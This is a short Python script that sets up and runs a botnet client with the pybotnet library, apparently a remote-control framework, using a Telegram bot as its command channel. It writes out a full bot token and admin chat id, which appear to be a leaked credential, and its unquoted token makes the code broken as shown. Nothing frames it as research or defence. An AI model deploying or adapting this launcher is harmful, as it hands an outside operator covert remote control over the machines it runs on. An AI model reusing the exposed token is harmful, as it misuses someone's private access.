from pybotnet import BotNet, TelegramEngine


telegram_engine = TelegramEngine(token=7013562413:AAEzAWVsbx8S7PMFSBblAWjKkTx-e1av5cM, admin_chat_id=7197726261) #(1)

botnet = BotNet(telegram_engine) # (2)
botnet.run()
